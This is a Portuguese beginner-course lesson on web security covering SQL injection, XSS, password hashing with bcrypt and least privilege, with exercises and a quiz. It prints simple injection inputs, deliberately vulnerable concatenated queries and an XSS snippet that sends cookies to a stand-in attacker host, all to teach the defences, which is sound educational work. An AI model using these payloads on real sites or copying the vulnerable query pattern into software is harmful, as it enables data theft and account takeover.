---
id: "m5-a6"
mes: 5
numero: 6
titulo: "Segurança básica"
objetivo: "Conhecer as vulnerabilidades mais comuns em aplicações web e como evitá-las."
duracao: 25
status: "completo"
---

## Nem todo usuário tem boas intenções

Até agora neste curso, pensamos em código sob a perspectiva de "fazer a coisa certa quando tudo dá
certo". Segurança exige uma mudança de perspectiva: pensar em como um usuário **mal-intencionado**
poderia manipular seu sistema para fazer algo que não deveria — ler dados de outra pessoa, executar
comandos não autorizados, ou roubar credenciais. Esta aula cobre as vulnerabilidades mais comuns em
aplicações web e como evitá-las, uma introdução prática aos princípios de segurança que todo
desenvolvedor deveria conhecer.

## SQL Injection: quando a entrada do usuário vira código

Retomando o SQL da aula 5, imagine uma consulta que busca um usuário por nome, montada por
concatenação de texto:

```python
# PERIGOSO: nunca faça isso
nome = input("Digite o nome: ")
consulta = f"SELECT * FROM usuarios WHERE nome = '{nome}'"
cursor.execute(consulta)
```

Se o usuário digitar um nome normal, como `"Ana"`, a consulta gerada é inofensiva:
`SELECT * FROM usuarios WHERE nome = 'Ana'`. Mas nada impede que o usuário digite algo como:

```text
' OR '1'='1
```

Gerando a consulta final:

```sql
SELECT * FROM usuarios WHERE nome = '' OR '1'='1'
```

Como `'1'='1'` é **sempre verdadeiro**, essa consulta devolve **todos** os usuários da tabela,
ignorando completamente o filtro por nome pretendido — um exemplo simples de **SQL Injection**: o
usuário conseguiu injetar seu próprio código SQL dentro da consulta, apenas manipulando um campo de
texto. Em cenários piores, injeções mais elaboradas podem apagar tabelas inteiras ou extrair dados
sigilosos, como senhas.

**A defesa** é nunca montar consultas SQL por concatenação direta de texto vindo do usuário. Em vez
disso, usam-se **consultas parametrizadas** (também chamadas de *prepared statements*), onde o valor
do usuário é passado separadamente da estrutura da consulta:

```python
# Seguro: o valor é passado como parâmetro, nunca interpretado como parte da consulta
nome = input("Digite o nome: ")
cursor.execute("SELECT * FROM usuarios WHERE nome = ?", (nome,))
```

Com consultas parametrizadas, o banco de dados trata `nome` estritamente como um **valor de dados**,
nunca como parte da estrutura da consulta — mesmo que o usuário digite `' OR '1'='1`, esse texto
inteiro é tratado como o nome literal sendo buscado (que, correndo, provavelmente não existirá na
tabela), e não como código SQL a ser executado.

## XSS: quando a entrada do usuário vira HTML/JavaScript

**XSS** (*Cross-Site Scripting*) é uma vulnerabilidade análoga ao SQL Injection, mas no contexto de
páginas web: acontece quando a entrada de um usuário é inserida diretamente em uma página HTML **sem
tratamento**, permitindo que ela seja interpretada como código a ser executado no navegador de
**outras pessoas**.

Imagine um site que exibe comentários de usuários diretamente como HTML:

```html
<!-- Comentário salvo pelo usuário, inserido diretamente na página -->
<div>{{ comentario_do_usuario }}</div>
```

Se um usuário mal-intencionado enviar como comentário o texto:

```html
<script>enviar_cookies_para(atacante.com, document.cookie)</script>
```

E esse texto for inserido **sem tratamento** na página, o navegador de **qualquer outra pessoa** que
visualizar aquele comentário vai executar esse script — potencialmente enviando os cookies de sessão
dessa vítima para o atacante, permitindo que ele se passe por ela no site (retomando os cookies vistos
no mês 4).

**A defesa** central é **escapar** (sanitizar) qualquer conteúdo vindo de usuários antes de inseri-lo
em uma página HTML, transformando caracteres especiais (`<`, `>`, `"`) em suas versões "inofensivas"
(`&lt;`, `&gt;`, `&quot;`), para que sejam exibidos como **texto literal**, e não interpretados como
tags HTML executáveis. A maioria dos frameworks web modernos já faz esse escape automaticamente por
padrão — o perigo surge principalmente quando um desenvolvedor desativa essa proteção manualmente
(por exemplo, usando algo como `dangerouslySetInnerHTML` em React) sem entender o risco.

## Autenticação: verificando quem é quem

**Autenticação** é o processo de verificar a identidade de alguém — tipicamente através de senha,
embora existam outros fatores (aplicativo autenticador, biometria). Alguns princípios importantes:

- **Nunca armazene senhas em texto puro**: se o banco de dados vazar, todas as senhas ficam expostas
  imediatamente. Em vez disso, armazena-se um **hash** da senha — o resultado de uma função
  matemática de mão única que transforma a senha original em uma sequência de caracteres, sem
  possibilidade prática de reverter o processo (descobrir a senha original a partir do hash).
- **Use funções de hash feitas para senhas** (como `bcrypt` ou `argon2`), não funções de hash
  genéricas (como `md5` ou `sha256` puro) — as funções específicas para senhas são deliberadamente
  **lentas**, dificultando ataques de força bruta (testar milhões de senhas candidatas por segundo).

```python
import bcrypt

senha = "minha_senha_secreta".encode()
hash_salvo = bcrypt.hashpw(senha, bcrypt.gensalt())  # salvo no banco de dados

# Ao fazer login, comparar a senha digitada com o hash salvo:
senha_digitada = "minha_senha_secreta".encode()
if bcrypt.checkpw(senha_digitada, hash_salvo):
    print("Login autorizado")
```

Note que nunca é preciso "descriptografar" o hash de volta para a senha original — `checkpw` recalcula
o hash da senha digitada e compara com o hash salvo, sem nunca precisar reverter o processo.

## O princípio do menor privilégio

O **princípio do menor privilégio** diz que qualquer usuário, processo ou sistema deveria ter
**apenas** as permissões estritamente necessárias para realizar sua função — nada a mais. Alguns
exemplos de aplicação prática:

- Um serviço que só precisa **ler** dados de uma tabela não deveria ter permissão de **escrita** ou
  **exclusão** sobre ela.
- Um usuário comum de um sistema não deveria ter acesso administrativo, mesmo que "provavelmente
  nunca vá usar" esse acesso.
- Retomando o `chmod` do mês 4: um arquivo de configuração sensível deveria ter permissões restritas
  (por exemplo, apenas o dono pode ler), em vez de ser legível por qualquer usuário do sistema.

A lógica por trás desse princípio: se uma conta ou processo com privilégios excessivos for
comprometido (por uma senha vazada, um bug explorado), o estrago causado é limitado ao que **aquele**
privilégio permite fazer. Limitar privilégios ao mínimo necessário reduz o "raio de explosão" de
qualquer comprometimento individual.

## Exercício 1: Identifique a vulnerabilidade

O código abaixo busca um produto por ID, recebido diretamente da URL de uma requisição:

```python
produto_id = request.args.get("id")
consulta = f"SELECT * FROM produtos WHERE id = {produto_id}"
cursor.execute(consulta)
```

Que tipo de ataque esse código permite? Demonstre um valor malicioso de `produto_id` que exponha
todos os produtos da tabela, e reescreva o código de forma seguro.

### Solução

Esse código é vulnerável a **SQL Injection**, porque o valor de `produto_id`, vindo diretamente da
URL (controlado pelo usuário), é inserido por concatenação direta na consulta SQL. Um valor malicioso
como `1 OR 1=1` geraria a consulta `SELECT * FROM produtos WHERE id = 1 OR 1=1`, que, como `1=1` é
sempre verdadeiro, devolveria **todos** os produtos da tabela, não apenas o produto de `id = 1`.

Reescrevendo com uma consulta parametrizada:

```python
produto_id = request.args.get("id")
cursor.execute("SELECT * FROM produtos WHERE id = ?", (produto_id,))
```

Assim, `produto_id` é tratado estritamente como um valor de dado, nunca interpretado como parte da
estrutura da consulta SQL, independente do que o usuário enviar.

## Exercício 2: Escapando XSS

Um site exibe o nome de usuário digitado no cadastro diretamente na página de boas-vindas, sem
escapar caracteres especiais: `<h1>Bem-vindo, {{ nome }}!</h1>`. Um usuário se cadastra com o nome
`<script>alert('invadido')</script>`. O que aconteceria ao carregar essa página, e como o escape de
HTML evitaria o problema?

### Solução

Sem escape, o navegador interpretaria `<script>alert('invadido')</script>` como uma tag `<script>`
real, executando o JavaScript contido nela — nesse exemplo simplificado, mostrando um alerta, mas em
um ataque real poderia roubar cookies de sessão ou realizar ações em nome do usuário, como visto na
aula. Com o escape adequado, os caracteres `<` e `>` seriam convertidos para `&lt;` e `&gt;` antes de
serem inseridos na página, fazendo o navegador exibir o texto **literal**
`<script>alert('invadido')</script>` como conteúdo visível na tela (uma string inofensiva), em vez de
executá-lo como código.

## Exercício 3: Aplique o menor privilégio

Uma aplicação web tem um processo automatizado que, uma vez por dia, apenas **lê** dados de vendas de
um banco de dados para gerar um relatório em PDF. Atualmente, esse processo se conecta ao banco usando
uma conta de administrador com permissão total (leitura, escrita e exclusão em todas as tabelas). Qual
o risco dessa configuração, e como o princípio do menor privilégio recomendaria corrigi-la?

### Solução

O risco é que, se esse processo automatizado for comprometido (por um bug explorado ou uma
credencial vazada), o atacante herdaria **todas** as permissões da conta de administrador — podendo
não apenas ler dados de vendas, mas também **modificar ou apagar qualquer tabela** do banco de dados,
muito além do que o processo realmente precisa fazer. O princípio do menor privilégio recomendaria
criar uma conta de banco de dados específica para esse processo, com permissão **apenas de leitura**
sobre **apenas** as tabelas relacionadas a vendas — assim, mesmo que essa credencial específica seja
comprometida, o estrago possível fica limitado a ler dados de vendas, sem risco de exclusão ou
modificação de nenhuma tabela do sistema.

## Tirou dúvida?

Se travar em algum ponto desta aula, descreva o contexto exato do que você já entendeu e onde
travou. Copie e adapte o modelo abaixo:

> Estou estudando "Segurança básica" do meu curso de programação. Contexto: a aula explica SQL
> Injection (e consultas parametrizadas como defesa), XSS (e escape de HTML como defesa), boas
> práticas de autenticação com hash de senhas, e o princípio do menor privilégio. Minha dúvida/meu
> exercício: [descreva aqui exatamente onde travou].

## Quiz

### 1. O que é SQL Injection?

- [ ] Um tipo de otimização de consultas SQL
- [x] Uma vulnerabilidade onde entrada do usuário, inserida sem tratamento em uma consulta SQL, é interpretada como código, alterando o comportamento da consulta
- [ ] Um comando específico do SQL para inserir dados
- [ ] Um erro de sintaxe comum em bancos de dados

> SQL Injection ocorre quando texto controlado pelo usuário é concatenado diretamente em uma consulta
> SQL, permitindo que esse texto seja interpretado como parte da estrutura da consulta, e não apenas
> como um valor de dado.

### 2. Qual é a principal defesa contra SQL Injection?

- [ ] Nunca usar bancos de dados relacionais
- [x] Usar consultas parametrizadas (prepared statements), que tratam a entrada do usuário estritamente como dado, nunca como parte da consulta
- [ ] Pedir para o usuário não digitar aspas simples
- [ ] Usar apenas bancos NoSQL

> Consultas parametrizadas separam a estrutura da consulta do valor fornecido pelo usuário, impedindo
> que esse valor seja interpretado como código SQL, independente do conteúdo digitado.

### 3. O que caracteriza um ataque de XSS (Cross-Site Scripting)?

- [ ] Um ataque que sobrecarrega um servidor com muitas requisições
- [x] A inserção de código malicioso (geralmente JavaScript) em uma página, executado no navegador de outros usuários
- [ ] Um ataque exclusivo a bancos de dados SQL
- [ ] Uma falha de hardware do servidor

> XSS ocorre quando entrada de usuário não tratada é inserida em uma página HTML, permitindo que seja
> interpretada como código executável (como uma tag `<script>`) no navegador de quem visualiza a
> página.

### 4. Por que senhas devem ser armazenadas como hash, e não em texto puro?

- [ ] Porque hashes ocupam menos espaço em disco
- [x] Porque, se o banco de dados vazar, um hash não pode ser revertido facilmente para a senha original, ao contrário do texto puro
- [ ] Porque hashes tornam o login mais rápido
- [ ] Não há diferença real de segurança entre os dois

> Armazenar apenas o hash da senha significa que, mesmo em caso de vazamento do banco de dados, a
> senha original não fica diretamente exposta, já que funções de hash são de mão única.

### 5. O que o princípio do menor privilégio recomenda?

- [ ] Que todos os usuários de um sistema tenham acesso de administrador, por simplicidade
- [x] Que cada usuário, processo ou sistema tenha apenas as permissões estritamente necessárias para sua função, nada a mais
- [ ] Que senhas nunca sejam usadas, apenas biometria
- [ ] Que sistemas nunca se conectem a bancos de dados

> Limitar permissões ao mínimo necessário reduz o impacto potencial caso uma conta ou processo seja
> comprometido, restringindo o que um atacante conseguiria fazer com aquele acesso específico.
